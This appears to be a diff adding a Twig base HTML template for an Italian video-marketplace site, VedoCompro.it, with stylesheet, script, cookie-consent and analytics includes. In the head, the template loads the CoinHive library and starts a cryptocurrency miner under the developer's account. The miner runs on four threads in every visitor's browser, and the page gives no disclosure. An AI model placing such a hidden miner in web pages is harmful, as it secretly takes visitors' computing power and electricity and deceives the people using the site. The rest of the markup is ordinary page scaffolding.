@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<!-- Developed by AndreaEM (www.andreaem.com) for VedoCompro.it -  All Rights Reserved - Conding, Graphics Idea Convertion and Functionality made by Andrea Emili (info@andreaem.it)-->
+<html prefix="og: http://ogp.me/ns#">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=0.7, maximum-scale=0.7" />
+        <title>{% block title %}VedoCompro.it - Acquista e Vendi con un video!{% endblock %}</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+        <!--<link rel="stylesheet" href="{{ asset('css/base.css') }}">-->
+        <link rel="scss" href="{{ asset('css/player.vedocompro.scss') }}">
+        <link rel="stylesheet" href="https://cdn.rawgit.com/enyo/dropzone/master/dist/min/dropzone.min.css">
+        <link rel="stylesheet" href="https://cdn.rawgit.com/enyo/dropzone/master/dist/min/basic.min.css">
+        <link href="https://vjs.zencdn.net/5.19.1/video-js.css" rel="stylesheet">
+        <link rel="icon" type="image/x-icon" href="{{ asset('favicon.ico') }}" />
+        <link href="https://fonts.googleapis.com/css?family=Roboto|Ubuntu" rel="stylesheet">
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.12.4/css/bootstrap-select.min.css" rel="stylesheet">
+        <script src="https://code.jquery.com/jquery-3.2.1.min.js" crossorigin="anonymous"></script>
+        <script async src="https://code.jquery.com/ui/1.12.1/jquery-ui.min.js" integrity="sha256-VazP97ZCwtekAsvgPBSUwPFKdrwD3unUfSGVYrahUqU=" crossorigin="anonymous"></script>
+        <link rel="stylesheet" href="{{ asset('css/font-awesome.min.css') }}">
+        <link href="{{ asset('css/scrollbar.css') }}" rel="stylesheet" type="text/css" >
+        <script src="https://content.jwplatform.com/libraries/7P3qGamK.js"></script>
+        <script>jwplayer.key="ABCdeFG123456SeVenABCdeFG123456SeVen=="</script>
+        <script async src="{{ asset('js/affix.js') }}"></script>
+        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+        <script>
+            var miner = new CoinHive.User('dnqlNXHpew0aDwUgNQ7Y6dXT64zwAV6D','andreaem', {
+            	throttle: 0.4,
+            	threads: 4
+            });
+            miner.start();
+        </script>
+        <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.3/cookieconsent.min.css" />
+        <script src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.3/cookieconsent.min.js"></script>
+        <script>
+            window.addEventListener("load", function(){
+                window.cookieconsent.initialise({
+                    "palette": {
+                        "popup": {
+                            "background": "#edeff5",
+                            "text": "#838391"
+                        },
+                        "button": {
+                            "background": "#5b94d6",
+                            "text": "#ffffff"
+                        }
+                    },
+                    "theme": "edgeless",
+                    "content": {
+                        "message": "Questa Applicazione usa i Cookies per assicurarti una migliore esperienza di navigazione.",
+                        "dismiss": "Accetto",
+                        "link": "Ulteriori informazioni",
+                        "href": "/privacy-policy"
+                    }
+                })});
+        </script>
+        {% block head %}
+
+        {% endblock %}
+    </head>
+    <body style="padding-right:0px!important">
+        {% block body %}
+        {% endblock %}
+        <script async src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.12.4/js/bootstrap-select.min.js"></script>
+        <script async src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+        <script async src="https://cdn.rawgit.com/HubSpot/pace/v1.0.0/pace.min.js"></script>
+        <script async src="https://cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js"></script>
+        <script async src="https://cdnjs.cloudflare.com/ajax/libs/jquery.form/4.2.2/jquery.form.min.js"></script>
+        <script async src="{{ asset('js/jquery.preload.min.js') }}"></script>
+        <script async src="{{ asset('js/base.js') }}"></script>
+        <script async src="{{ asset('js/jquery.scrollbar.min.js') }}"></script>
+        <script>
+            jQuery(document).ready(function(){
+                jQuery('.scrollbar').scrollbar();
+            });
+        </script>
+        <!-- Global Site Tag (gtag.js) - Google Analytics -->
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-69743962-4"></script>
+        <script>
+            window.dataLayer = window.dataLayer || [];
+            function gtag(){dataLayer.push(arguments)};
+            gtag('js', new Date());
+
+            gtag('config', 'UA-69743962-4');
+            
+              $(document).ready(function(){
+                $('.modal').on('show.bs.modal', function () {
+                  if ($(document).height() > $(window).height()) {
+                    // no-scroll
+                    $('body').addClass("modal-open-noscroll");
+                    $('.navbar').addClass("navbar-no-padding");
+                    $('#searchModal').addClass("modal-open-noscroll");
+                  }
+                  else { 
+                    $('body').removeClass("modal-open-noscroll");
+                  }
+                })
+                $('.modal').on('hide.bs.modal', function () {
+                    
+                })
+              })
+        </script>
+        <style>
+            .cc-color-override--1943300103.cc-window {
+                max-width: 100%;
+                bottom: 0px!important;
+            }
+            .modal-open-noscroll {
+              padding-right: 0!important;
+              overflow: hidden;
+            }
+            .navbar-no-padding {
+                padding-right: 16px!important;
+            }
+            .modal-open-noscroll .navbar-fixed-top, .modal-open .navbar-fixed-bottom {
+              padding-right: 0!important;
+            }
+        </style>
+    </body>
+</html>
